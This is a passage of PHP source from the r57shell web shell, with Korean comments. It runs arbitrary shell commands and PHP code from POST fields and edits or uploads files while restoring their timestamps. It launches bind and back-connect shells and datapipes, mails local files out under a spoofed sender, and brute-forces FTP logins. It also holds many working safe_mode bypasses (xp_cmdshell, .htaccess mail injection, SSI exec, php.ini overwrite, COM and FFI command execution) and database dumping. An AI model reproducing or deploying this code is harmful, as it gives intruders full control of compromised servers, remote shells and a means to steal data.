    echo "<font color=red>OFF</font>";
}
echo "</b>".ws(2);


/******************************************************************************************************/
// FUNCTION_COED : FC-0057
//

echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');

if($pg_on)
{
    echo "<font color=green>ON</font>";
}
else
{
    echo "<font color=red>OFF</font>";
}
echo "</b>".ws(2);


/******************************************************************************************************/
// FUNCTION_COED : FC-0058
//

echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');

if($ora_on)
{
    echo "<font color=green>ON</font>";
}
else
{
    echo "<font color=red>OFF</font>";
}

echo "</b><br>".ws(2);


/******************************************************************************************************/
// FUNCTION_COED : FC-0059
//

// 첫번째 칸 채움
echo "Disable functions : <b>";

if(''==($df=@ini_get('disable_functions')))
{
    echo "<font color=green>NONE</font></b>";
}
else
{
    echo "<font color=red>$df</font></b>";
}

$free = @diskfreespace($dir);

if (!$free)
{
    $free = 0;
}

$all = @disk_total_space($dir);

if (!$all)
{
    $all = 0;
}

//두번째 칸 테이블 크기 조절
echo "<br>".ws(2)."Free space : <b>".view_size($free)."</b> Total space: <b>".view_size($all)."</b>";
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=50>';


/******************************************************************************************************/
// FUNCTION_COED : FC-0060
//

// 두번째 칸 채움
echo $font;
if($unix)
{
    echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
    echo "</td><td>";
    echo "<font face=Verdana size=-2 color=red><b>";
    echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
    echo ws(3).$sysctl."<br>";
    echo ws(3).ex('echo $OSTYPE')."<br>";
    echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";

	if(!empty($id))
	{
	    echo ws(3).$id."<br>";
	}
    else if(function_exists('posix_geteuid') && function_exists('posix_getegid') && function_exists('posix_getgrgid') && function_exists('posix_getpwuid'))
    {
        $euserinfo  = @posix_getpwuid(@posix_geteuid());
        $egroupinfo = @posix_getgrgid(@posix_getegid());
        echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';
    }
    else
	{
	    echo ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>";
	}

    echo ws(3).$dir;
    echo ws(3).'( '.perms(@fileperms($dir)).' )';
    echo "</b></font>";
}
else
{
    echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
    echo "</td><td>";
    echo "<font face=Verdana size=-2 color=red><b>";
    echo ws(3).@substr(@php_uname(),0,120)."<br>";
    echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
    echo ws(3).@getenv("USERNAME")."<br>";
    echo ws(3).$dir;
    echo "<br></font>";
}

echo "</font>";
echo "</td></tr></table>";

/******************************************************************************************************/
// FUNCTION_COED : FC-0061
//


if(!empty($_POST['cmd']) && $_POST['cmd']=="mail")
{
    $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$_POST['from']."\r\n");
    err(6+$res);
    $_POST['cmd']="";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0062
//



if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
{
    if(!$file=@fopen($_POST['loc_file'],"r"))
	{
	    err(1,$_POST['loc_file']); $_POST['cmd']="";
	}
    else
    {
        $filename = @basename($_POST['loc_file']);
        $filedump = @fread($file,@filesize($_POST['loc_file']));
        fclose($file);
        $content_encoding=$mime_type='';
        compress($filename,$filedump,$_POST['compress']);

        $attach = array(
                        "name"=>$filename,
                        "type"=>$mime_type,
                        "content"=>$filedump
        );

        if(empty($_POST['subj']))
	    {
	        $_POST['subj'] = 'file from r57shell';
	    }

        if(empty($_POST['from']))
	    {
	        $_POST['from'] = 'billy@microsoft.com';
	    }

        $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
        err(6+$res);
        $_POST['cmd']="";
    }
 }


/******************************************************************************************************/
// FUNCTION_COED : FC-0063
//



if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
    $_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0064
//



if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
{
    switch($_POST['what'])
    {
        case 'own':

            @chown($_POST['param1'],$_POST['param2']);

        break;

        case 'grp':

            @chgrp($_POST['param1'],$_POST['param2']);

        break;

        case 'mod':

            @chmod($_POST['param1'],intval($_POST['param2'], 8));

        break;
    }

    $_POST['cmd']="";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0065
//


if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
{
    switch($_POST['what'])
    {
        case 'file':

            if($_POST['action'] == "create")
            {
                if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w"))
				{
				    err(2,$_POST['mk_name']); $_POST['cmd']="";
				}
                else
		        {
                    fclose($file);
                    $_POST['e_name'] = $_POST['mk_name'];
                    $_POST['cmd']="edit_file";
                    echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
                }
            }
            else if($_POST['action'] == "delete")
            {
                if(unlink($_POST['mk_name']))
				{
				    echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
				}

				$_POST['cmd']="";
            }
        break;

        case 'dir':

            if($_POST['action'] == "create")
			{
                if(mkdir($_POST['mk_name']))
                {
                    $_POST['cmd']="";
                    echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
                }
                else
				{
				    err(2,$_POST['mk_name']);
					$_POST['cmd']="";
                }
            }
            else if($_POST['action'] == "delete")
			{
                if(rmdir($_POST['mk_name']))
				{
				    echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
                }

                $_POST['cmd']="";
            }
        break;
    }
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0066
//



if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
{
    if(!$file=@fopen($_POST['e_name'],"r+"))
	{
	    $only_read = 1; @fclose($file);
	}

    if(!$file=@fopen($_POST['e_name'],"r"))
	{
	    err(1,$_POST['e_name']); $_POST['cmd']="";
	}
    else
	{
        echo $table_up3;
        echo $font;
        echo "<form name=save_file method=post>";
        echo ws(3)."<b>".$_POST['e_name']."</b>";
        echo "<div align=center><textarea name=e_text cols=121 rows=24>";
        echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
        fclose($file);
        echo "</textarea>";
        echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
        echo "<input type=hidden name=dir value=".$dir.">";
        echo "<input type=hidden name=cmd value=save_file>";
        echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
        echo "</div>";
        echo "</font>";
        echo "</form>";
        echo "</td></tr></table>";
        exit();
    }
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0067
//



if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
{
    $mtime = @filemtime($_POST['e_name']);

    if(!$file=@fopen($_POST['e_name'],"w"))
	{
	    err(0,$_POST['e_name']);
	}
    else
	{
        if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
        @fwrite($file,$_POST['e_text']);
        @touch($_POST['e_name'],$mtime,$mtime);
        $_POST['cmd']="";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
    }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0068
//


if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
    cf("/tmp/bd.c",$port_bind_bd_c);
    $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
    @unlink("/tmp/bd.c");
    $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
    $_POST['cmd']="ps -aux | grep bd";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0069
//



if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
    cf("/tmp/bdpl",$port_bind_bd_pl);
    $p2=which("perl");
    $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
    $_POST['cmd']="ps -aux | grep bdpl";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0070
//



if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
    cf("/tmp/back",$back_connect);
    $p2=which("perl");
    $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
    $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0071
//

if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
    cf("/tmp/back.c",$back_connect_c);
    $blah = ex("gcc -o /tmp/backc /tmp/back.c");
    @unlink("/tmp/back.c");
    $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
    $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0072
//
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
    cf("/tmp/dp",$datapipe_pl);
    $p2=which("perl");
    $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
    $_POST['cmd']="ps -aux | grep dp";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0072
//
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
    cf("/tmp/dpc.c",$datapipe_c);
    $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
    @unlink("/tmp/dpc.c");
    $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
    $_POST['cmd']="ps -aux | grep dpc";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0073
//
if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']]))
{
    $_POST['cmd'] = $aliases[$_POST['alias']];
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0074
//
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
    if(!empty($_POST['new_name']))
	{
	    $nfn = $_POST['new_name'];
	}
    else
	{
	    $nfn = $HTTP_POST_FILES['userfile']['name'];
	}

    @copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0075
//

if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
	switch($_POST['with'])
	{
		case wget:

			$_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";

		break;

		case fetch:

			$_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";

		break;

		case lynx:

			$_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";

		break;

		case links:

			$_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";

		break;

		case GET:

			$_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";

		break;

		case curl:

			$_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";

		break;
	}
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0076
//

if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
{

	list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
	if(empty($ftp_port)) { $ftp_port = 21; }
	$connection = @ftp_connect ($ftp_server,$ftp_port,10);

	if(!$connection)
	{
	    err(3);
	}
	else
	{
	    if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password']))
		{
		    err(4);
		}
	    else
        {
            if($_POST['cmd']=="ftp_file_down")
			{
			    if(chop($_POST['loc_file'])==$dir)
				{
				    $_POST['loc_file']=$dir.((!$unix)?('\\'):('/')).basename($_POST['ftp_file']);

				}
				@ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);

			}

            if($_POST['cmd']=="ftp_file_up")
			{
			    @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);
			}
        }
    }

    @ftp_close($connection);
    $_POST['cmd'] = "";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0077
//



if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
{
    list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);

    if(empty($ftp_port))
	{
	    $ftp_port = 21;
	}

    $connection = @ftp_connect ($ftp_server,$ftp_port,10);

    if(!$connection)
	{
	    err(3);
		$_POST['cmd'] = "";
	}
    else if(!$users=get_users())
	{
	    echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>";
		$_POST['cmd'] = "";
	}
    @ftp_close($connection);
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0078
//


// 두번째 박스 음영 추가
echo $table_up3;

/******************************************************************************************************/
// FUNCTION_COED : FC-0079
//



if (empty($_POST['cmd'])&&!$safe_mode)
{
    $_POST['cmd']=(!$unix)?("dir"):("ls -lia");
}
else if(empty($_POST['cmd'])&&$safe_mode)
{
    $_POST['cmd']="safe_dir";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0080
//


// 세번째 박스 추가
echo $font.$lang[$language.'_text1'].": <b><a style='cursor: pointer;' id='runned_cmd' onclick='document.forms[0].cmd.value=this.innerHTML;'>".@htmlspecialchars($_POST['cmd'])."</a></b></font></td></tr><tr><td><b><div align=left><textarea id=report name=report cols=75 rows=23>";

/******************************************************************************************************/
// FUNCTION_COED : FC-0081
//


if($safe_mode)
{
    switch($_POST['cmd'])
    {
        case 'safe_dir':
            $d=@dir($dir);
            if ($d)
            {
                while (false!==($file=$d->read()))
                {

                    if ($file=="." || $file=="..")
					{
					    continue;
					}

                    @clearstatcache();

                    list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);

                    if(!$unix)
					{
                        echo date("d.m.Y H:i",$mtime);
                        if(@is_dir($file))
						{
						    echo "  <DIR> ";
						}else
						{
						    printf("% 7s ",$size);
						}
                    }
                    else
					{
                        $owner = @posix_getpwuid($uid);
                        $grgid = @posix_getgrgid($gid);
                        echo $inode." ";
                        echo perms(@fileperms($file));
                        printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
                        echo date("d.m.Y H:i ",$mtime);
                    }
                    echo "$file\n";
                }
            $d->close();
            }
            else
			{
			    echo $lang[$language.'_text29'];
			}

        break;

        case 'test1':

            $ci = @curl_init("file://".$_POST['test1_file']."");
            $cf = @curl_exec($ci);
            echo $cf;

        break;

        case 'test2':

            @include($_POST['test2_file']);

        break;

        case 'test3':

            if(empty($_POST['test3_port']))
			{
			    $_POST['test3_port'] = "3306";
			}

            $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);

            if($db)
            {
                if(@mysql_select_db($_POST['test3_md'],$db))
                {
                    @mysql_query("DROP TABLE IF EXISTS temp_r57_table");
                    @mysql_query("CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL )");
                    @mysql_query("LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table");
                    $r = @mysql_query("SELECT * FROM temp_r57_table");

                    while(($r_sql = @mysql_fetch_array($r)))
					{
					    echo @htmlspecialchars($r_sql[0]);
					}

                    @mysql_query("DROP TABLE IF EXISTS temp_r57_table");
                }
                else
			    {
			        echo "[-] ERROR! ".$sql->error;
			    }

                @mysql_close($db);
            }
            else
			{
			    echo "[-] ERROR! ".$sql->error;
			}
        break;

        case 'test4':

            if(empty($_POST['test4_port']))
			{
			    $_POST['test4_port'] = "1433";
			}

            $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
            if($db)
            {

                if(@mssql_select_db($_POST['test4_md'],$db))
                {
                    @mssql_query("drop table r57_temp_table",$db);
                    @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
                    @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
                    $res = mssql_query("select * from r57_temp_table",$db);
                    while(($row=@mssql_fetch_row($res)))
                    {
                        echo $row[0]."\r\n";
                    }

                    @mssql_query("drop table r57_temp_table",$db);
                }
                else
				{
				    echo "[-] ERROR! ".$sql->error;
				}

                @mssql_close($db);
            }
            else
			{
			    echo "[-] ERROR! ".$sql->error;
			}
        break;


        case 'test5':

            if (@file_exists('/tmp/mb_send_mail'))
			{
			    @unlink('/tmp/mb_send_mail');
			}


			$extra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
			@mb_send_mail(NULL, NULL, NULL, NULL, $extra);
			$lines = file ('/tmp/mb_send_mail');
			foreach ($lines as $line)
			{
				echo htmlspecialchars($line)."\r\n";
			}

		break;

		case 'test6':

			$stream = @imap_open('/etc/passwd', "", "");
			$dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");

			for ($i = 0; $i < count($dir_list); $i++)
			{
				echo $dir_list[$i]."\r\n";
			}

			@imap_close($stream);

		break;

		case 'test7':

			$stream = @imap_open($_POST['test7_file'], "", "");
			$str = @imap_body($stream, 1);
			echo $str;
			@imap_close($stream);

		break;

		case 'test8':

			if(@copy("compress.zlib://".$_POST['test8_file1'], $_POST['test8_file2']))
			{
				echo $lang[$language.'_text118'];
			}
			else
			{
				echo $lang[$language.'_text119'];
			}

		break;

		case 'test9':

			$cur_dir = dirname(__FILE__);
			if(!file_exists("$cur_dir/php_ini_backup") && @rename("$cur_dir/php.ini","$cur_dir/php_ini_backup"))
			{
				echo $lang[$language.'_text121'];
			}

			if($file=@fopen("$cur_dir/php.ini","w"))
			{
				@fwrite($file,"safe_mode = Off\nsafe_mode_gid = Off\nsafe_mode_include_dir =\nsafe_mode_exec_dir =\nopen_basedir =\ndisable_functions =\ndisable_classes =\nfile_uploads = On\nallow_url_fopen = On\n");
				@fclose($file);
			}
		break;

		case 'test10':

			@error_log($_POST['test10_content'], 3,"php://../../".$_POST['test10_file']);

		break;

		case 'test11':

			if(file_exists("./result.txt") && file_exists("./.htaccess"))
			{
				@unlink("./.htaccess");
				@unlink("./result.txt");
			}

			if ($handle = @fopen("./.htaccess", 'w'))
			{
				@fwrite($handle, "php_value mail.force_extra_parameters '-t && ".$_POST['test11_cmd']." > ".dirname($_SERVER["SCRIPT_FILENAME"])."/result.txt'");
				mail("", "", "");
			}

			//while(!file_exists(dirname($_SERVER["SCRIPT_FILENAME"])."/result.txt")) sleep(1);

			if($lines) foreach ($lines as $line)
			{
				echo htmlspecialchars($line);
			}

		break;

		case 'test12':

			if ($handle = @fopen("./.htaccess", 'w'))
			{
				@fwrite($handle, "AddType text/html .shtml\r\nAddHandler server-parsed .shtml\r\nOptions +Includes");
			}

			if ($handle = @fopen("./cmdssi.shtml", 'w'))
			{
				@fwrite($handle, '<!--#exec cmd="'.$_POST['test12_cmd'].'"-->');
			}


			// url_fopen

			@include("http://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['PHP_SELF']),'/\\')."/cmdssi.shtml");

		break;

		case 'test13':

			$tmp = '';
			if(@is_writable($_ENV['TMP']))
			{
				$tmp=$_ENV['TMP'];

			}elseif(@is_writeable(ini_get('session.save_path')))
			{
				$tmp=ini_get('session.save_path');
			}
			elseif(@is_writeable(ini_get('upload_tmp_dir')))
			{
				$tmp=ini_get('upload_tmp_dir');
			}
			elseif(@is_writeable(dirname(__FILE__)))
			{
				$tmp=dirname(__FILE__);
			}
			else
			{
				break;
			}

			@unlink($tmp.'/result_test13.txt');
			$wscript = new COM('wscript.shell');
			$wscript->Run('cmd.exe /c "'.$_POST['test13_cmd'].'" > '.$tmp.'/result_test13.txt');

			while(!file_exists($tmp.'/result_test13.txt'))
			{
				sleep(1);
			}
			$lines = @file ($tmp.'/result_test13.txt');

			if($lines)
			{
				foreach ($lines as $line)
				{
					echo htmlspecialchars($line);
				}
			}

			@unlink($tmp.'/result_test13.txt');

		break;

		case 'test14':

			$ioncube = @ioncube_read_file($_POST['test14_cmd']);
			echo htmlspecialchars($ioncube);

		break;

		case 'test15':

			$tmp = '';
			if(@is_writable($_ENV['TMP']))
			{
				$tmp=$_ENV['TMP'];
			}
			elseif(@is_writeable(ini_get('session.save_path')))
			{
				$tmp=ini_get('session.save_path');
			}
			elseif(@is_writeable(ini_get('upload_tmp_dir')))
			{
				$tmp=ini_get('upload_tmp_dir');
			}
			elseif(@is_writeable(dirname(__FILE__)))
			{
				$tmp=dirname(__FILE__);
			}
			else
			{
				break;
			}


			@unlink($tmp.'/result_test15.txt');
			@win_shell_execute("cmd.exe","","/c ".$_POST['test15_cmd']." > ".$tmp."/result_test15.txt");

			while(!file_exists($tmp.'/result_test15.txt'))
			{
				sleep(1);
			}


			$lines = @file ($tmp.'/result_test15.txt');

			if($lines)
			{
				foreach ($lines as $line)
				{
					echo htmlspecialchars($line);
				}
			}


			@unlink($tmp.'/result_test15.txt');
		break;


		case 'test16':

			$tmp = '';
			if(@is_writable($_ENV['TMP']))
			{
				$tmp=$_ENV['TMP'];
			}
			elseif(@is_writeable(ini_get('session.save_path')))
			{
				$tmp=ini_get('session.save_path');
			}
			if(@is_writeable(ini_get('upload_tmp_dir')))
			{
				$tmp=ini_get('upload_tmp_dir');
			}
			elseif(@is_writeable(dirname(__FILE__)))
			{
				$tmp=dirname(__FILE__);
			}
			else
			{
				break;
			}

			$name=$tmp."\\".uniqid();
			$n=uniqid();
			$cmd=(empty($_SERVER['COMSPEC']))?'c:\\windows\\system32\\cmd.exe':$_SERVER['COMSPEC'];
			win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c ".$_POST['test16_cmd']." >\"$name\""));
			win32_start_service($n);
			win32_stop_service($n);
			win32_delete_service($n);

			while(!file_exists($name))
			{
				sleep(1);
			}

			$exec=file_get_contents($name);
			unlink($name);
			echo htmlspecialchars($exec);

		break;

		case 'test17':

			$_POST['test17_cmd'] = str_replace('\\','\\\\',$_POST['test17_cmd']);
			$perl = new Perl();
			$perl->eval('print `'.$_POST['test17_cmd'].'`');
		break;

		case 'test18':

			if(@is_writable($_ENV['TMP']))
			{
				$tmp=$_ENV['TMP'];
			}
			elseif(@is_writeable(ini_get('session.save_path')))
			{
				$tmp=ini_get('session.save_path');
			}

			if(@is_writeable(ini_get('upload_tmp_dir')))
			{
				$tmp=ini_get('upload_tmp_dir');
			}
			elseif(@is_writeable(dirname(__FILE__)))
			{
				$tmp=dirname(__FILE__);
			}
			else
			{
				break;
			}


			$name=$tmp."\\".uniqid();
			$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
			$res=$api->WinExec("cmd.exe /c ".$_POST['test18_cmd']." >\"$name\"",0);

			while(!file_exists($name))
			{
				sleep(1);
			}

			$exec=file_get_contents($name);
			unlink($name);
			echo htmlspecialchars($exec);
		break;

	}
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute"))
{
	$cmd_rep = ex($_POST['cmd']);
	if(!$unix)
	{
		echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n";
	}
	else
	{
		echo @htmlspecialchars($cmd_rep)."\n";
	}
}



/******************************************************************************************************/
// FUNCTION_COED : FC-0082
//


if ($_POST['cmd']=="ftp_brute")
{
	$suc = 0;
	foreach($users as $user)
	{
		$connection = @ftp_connect($ftp_server,$ftp_port,10);
		if(@ftp_login($connection,$user,$user))
		{
			echo "[+] $user:$user - success\r\n";
			$suc++;
		}
		else if(isset($_POST['reverse']))
		{
			if(@ftp_login($connection,$user,strrev($user)))
			{
				echo "[+] $user:".strrev($user)." - success\r\n"; $suc++;
			}
		}
		@ftp_close($connection);
	}

	echo "\r\n-------------------------------------\r\n";

	$count = count($users);
	if(isset($_POST['reverse']))
	{
		$count *= 2;
	}
	echo $lang[$language.'_text97'].$count."\r\n";
	echo $lang[$language.'_text98'].$suc."\r\n";
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0083
//



if ($_POST['cmd']=="php_eval")
{
    $eval = @str_replace("<?","",$_POST['php_eval']);
    $eval = @str_replace("?>","",$eval);
    @eval($eval);
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0084
//


if ($_POST['cmd']=="mysql_dump")
{
    if(isset($_POST['dif']))
	{
	    $fp = @fopen($_POST['dif_name'], "w");
	}

    $sql = new my_sql();
    $sql->db   = $_POST['db'];
    $sql->host = $_POST['db_server'];
    $sql->port = $_POST['db_port'];
    $sql->user = $_POST['mysql_l'];
    $sql->pass = $_POST['mysql_p'];
    $sql->base = $_POST['mysql_db'];

    if(!$sql->connect())
	{
	    echo "[-] ERROR! ".$sql->error;
	}
    else if(!$sql->select_db())
	{
	    echo "[-] ERROR! ".$sql->error;
	}
    else if(!$sql->dump($_POST['mysql_tbl']))
	{
	    echo "[-] ERROR! ".$sql->error;
	}
    else
	{
        if(empty($_POST['dif']))
		{
		    foreach($sql->dump as $v)
			{
			    echo $v."\r\n";
			}
		}
        else if($fp)
		{
		    foreach($sql->dump as $v)
			{
			    @fputs($fp,$v."\r\n");
			}
		}
        else
		{
		    echo "[-] ERROR! Can't write in ".$_POST['dif'];
		}
    }
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0085
//


echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<div class='block' style='display: none;' id='load'><font face=Verdana size=-2><b> Loading... </b></font></div>";
echo "<table width=100% cellpadding=0 cellspacing=0>";


/******************************************************************************************************/
// FUNCTION_COED : FC-0086
//


function div_title($title, $id)
{
    return '<a style="cursor: pointer;" onClick="change_divst(\''.$id.'\');">'.$title.'</a>';
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0087
//


function div($id)
{
    if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0)
	{
	    return '<div id="'.$id.'" style="display: none;">';
	}

    return '<div id="'.$id.'">';
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0088
//



if(!$safe_mode)
{
    echo '<form name=form method=POST onsubmit="return false">'.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd id="ajax_cmd" onkeyup="keyE(event)"',85,'').ws(4).'<noscript>'.in('submit','submit',0,$lang[$language.'_butt1']).'</noscript>');
    echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir id="ajax_dir"',85,$dir).ws(4));
    echo $te.'</div>'.$table_end1.$fe;
}
else
{
    echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;
    echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0089
//



echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'</div>'.$table_end1.$fe;


/******************************************************************************************************/
// FUNCTION_COED : FC-0090
//


if($safe_mode)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;
